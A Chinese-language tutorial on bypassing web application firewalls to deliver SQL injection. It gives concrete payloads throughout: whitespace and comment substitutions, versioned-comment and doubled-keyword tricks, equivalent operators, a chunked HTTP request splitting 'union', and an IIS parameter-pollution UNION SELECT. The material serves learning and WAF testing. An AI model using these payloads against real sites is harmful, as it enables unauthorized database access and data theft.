# 🛡️ 现代 WAF 深度绕过技术与 Tamper 变形矩阵

> **对抗核心哲学**：WAF（Web 应用防火墙）绕过的本质是**“语义解析差异（Parsing Mismatch）”**。
> 攻击者构造特殊的 Payload，使得**中间的 WAF 认为它是无害请求（或无法正确还原），而后端的数据库词法解析器却能 100% 正确执行**。

---

## 0. 基础前置认知与小白扫盲：WAF 是怎么被黑客“晃点”的？

> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。


### 1. WAF 与数据库解析引擎的“认知代沟”
* **WAF 的本质**：它本质上只是一个架设在 Web 前端的大号“正则表达式过滤器”，它的算力有限，只能看懂最规整、最标准的文字。
* **数据库解析引擎的本质**：数据库（如 MySQL / Oracle）拥有极其强大复杂的词法解析器（Lexer），为了兼容各种编程习惯，它支持各种极其冷门怪异的语法写法。
* **黑客绕过核心逻辑**：**专门挑选“WAF 以为是垃圾乱码、而数据库却能 100% 当作正常语法解析”的灰色地带进行投毒！**

---

### 2. 三大经典障眼法速查
* **空白符障眼法**：
  * WAF 拦截规则通常死死盯着空格（`%20`）。
  * 替代方案：MySQL 允许用内联注释 `/**/` 充当空格，允许用括号 `SELECT(username)FROM(users)` 替代空格，允许用换行符 `%0a` 或制表符 `%09` 充当分隔符！
* **大小写与多重 URL 编码**：
  * 很多初级规则只匹配小写 `union select`，输入 `uNiOn SeLeCt` 直接放行；
  * 如果系统有多层反向代理或网关，黑客将单引号编码两次变成 `%2527`（`%` 变成 `%25`）。第一层 WAF 看到 `%2527` 以为是无害字符串放行；到了第二层业务后端二次解码还原成真正的单引号 `'`，完成暗度陈仓！

## 一、空白符绕过矩阵（Whitespace Bypass）

当 WAF 依赖空格区分关键字（例如检测到 `SELECT` 后面紧跟空格加字段名才拦截）时，可利用数据库支持的非标准空白符实现突围。

### 1. 替代字符与编码字典表
| 绕过字符 / 编码 | 字符含义 | MySQL 底层支持 | 绕过机理 |
| :--- | :--- | :--- | :--- |
| `%09` | 水平制表符 (Tab) | ✅ 完美识别为分隔符 | 大多数正则只写了 `\s` 或字面空格，部分规则漏配 Tab。 |
| `%0A` | 换行符 (LF, `\n`) | ✅ 完美识别为分隔符 | **极高频有效**！能破坏单行正则匹配（使 `^...$` 失效）。 |
| `%0B` | 垂直制表符 (VT) | ✅ 完美识别为分隔符 | 历史冷门字符，WAF 规则库极易漏检。 |
| `%0C` | 换页符 (FF) | ✅ 完美识别为分隔符 | 特殊控制字符。 |
| `%0D` | 回车符 (CR, `\r`) | ✅ 完美识别为分隔符 | 常与 `%0A` 配合使用。 |
| `/**/` | SQL 空注释 | ✅ 忽略为空白 | 最经典手段，但多数商用 WAF 已对此防御。 |
| `%A0` | 不换行空格 (NBSP) | ⚠️ 依赖 Latin1 字符集 | 在特定字符集环境下解析为空白符。 |

### 2. 彻底消灭空格的“语法隔离法”
根本不使用任何空白字符，利用 SQL 语法中的自然括号与反引号进行语义隔离：
* **常规写法**：`SELECT id, username FROM users WHERE id = 1`
* **无空格写法**：
  ```sql
  SELECT(id),username`FROM`users`WHERE(id=1)
  ```
  或者：
  ```sql
  SELECT(id)FROM(users)WHERE(id=1)
  ```
  *说明：在 MySQL 中，函数名与括号、关键字与括号之间完全不需要空格即可被词法解析器精准解构。*

## 二、关键字混淆与等价语义矩阵

### 1. 基础混淆技巧
* **大小写混合随机化**：`uNiOn SeLeCt`（针对简单黑名单）。
* **双写复写绕过**：`ununionion selselectect`
  * *生效场景*：后端防护代码使用粗暴的 `str_ireplace('union', '', $sql)` 只过滤替换一次。中间的 `union` 被剔除后，两侧残留字符自动拼接形成新的完整 `union`！
* **MySQL 版本号内联注释**：
  ```sql
  /*!50000SELECT*//*!50000user*//*!50000()*/
  ```
  * *底层机理*：`/*!50000...*/` 表示“当当前 MySQL 版本 $\ge 5.00.00$ 时，内部代码被当作纯 SQL 指令执行，否则当作注释忽略”。由于绝大多数环境均为 5.0+，MySQL 正常执行，但许多 WAF 会误认为它只是一段普通的被注释文本而不予拦截！

---

### 2. 等价逻辑与操作符替换全景表
当核心关键字被 WAF 彻底扼杀时，使用如下数学与逻辑等价式进行无缝平替：

| 被禁关键字 / 符号 | 等价替换方案 | 实战示例与深度细节 |
| :--- | :--- | :--- |
| `AND` | `&&`、`^` (异或)、`*` (算术乘) | `?id=1'&&'1'='1`<br>`?id=1'^(ascii(...)>100)--+` |
| `OR` | `||` | `?id=1'||'1'='1` |
| `=` (等号) | `LIKE`、`REGEXP`、`IN`、`BETWEEN`、`<=>` | `WHERE username LIKE 'admin'`<br>`WHERE username REGEXP '^admin$'`<br>`WHERE id <=> 1` (**安全等号，可比对 NULL**) |
| `>` / `<` (大小比较) | `GREATEST()`、`LEAST()`、`BETWEEN` | `WHERE GREATEST(ascii(...), 100) = ascii(...)`（如果字符 ASCII 大于 100，`GREATEST` 返回该字符本身） |
| `,` (逗号) | `FROM ... FOR ...`<br>`JOIN` 联表 | `SUBSTR(str FROM 1 FOR 1)`<br>`LIMIT 1 OFFSET 0` (替代 `LIMIT 0,1`) |
| `UNION SELECT` 中的逗号 | `JOIN` 联查子查询 | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` (**完全无逗号联合查询！**) |

## 三、协议与传输层高级绕过技术

超越纯字符替换，在 HTTP 协议层对传输载荷进行维度升维打击：

### 1. 分块传输编码绕过（Chunked Transfer Encoding）
* **原理**：在 HTTP/1.1 POST 请求中，加入 Header：`Transfer-Encoding: chunked`。
* 客户端可以将请求体切碎为多个数据块（Hex 长度 + 内容）。
* **WAF 破防机制**：如果 WAF 的反向代理性能不足，没有重组完整的 HTTP 请求体就直接放行，或者 WAF 解析分块的逻辑存在 Bug，那么拆碎后的关键字（如一个块传输 `uni`，下一个块传输 `on`）将完全逃逸 WAF 规则库！

#### 🔍 原始 HTTP 请求分块报文示例：
```http
POST /login.php HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

3
id=
3
-1'
5
 unio
2
n 
6
select
...
0

```

---

### 2. HTTP 参数污染（HPP - HTTP Parameter Pollution）
不同 Web 中间件在遇到同名 URL 参数时的解析逻辑存在天然差异：

| Web 服务器 / 中间件 | 遇到 `?id=1&id=2` 时的处理逻辑 |
| :--- | :--- |
| **PHP / Apache** | 仅获取**最后一个**：`id = 2` |
| **ASP.NET / IIS** | **自动使用逗号拼接**：`id = 1,2` |
| **JSP / Tomcat** | 仅获取**第一个**：`id = 1` |

#### 🔍 IIS / ASP.NET HPP 攻击 Payload：
```http
GET /test.aspx?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3--
```
* **WAF 视角**：每个独立参数 `id=1/*`、`id=*/UNION/*` 看起来都只是无害的字符串和碎片，不会触发整体规则报警；
* **后端 IIS 视角**：IIS 将所有 `id` 拼接在一起，还原为：
  `id = 1/*,*/UNION/*,*/SELECT/*,*/1,2,3--`，利用注释将逗号消化，成功执行注入！

---

### 3. 请求类型突变（Content-Type 变形）
当 WAF 针对 `application/x-www-form-urlencoded` 进行了严密审查时：
* 人为将请求头修改为 `multipart/form-data; boundary=----WebKitFormBoundary...`；
* 将原本的 GET/POST 参数改为文件上传表单格式传输，并在 `Content-Disposition` 处加入双重换行或畸形分号。
* 大量简易 WAF 并不支持深度解析复杂的多段 MIME 表单，直接放行直通后端！
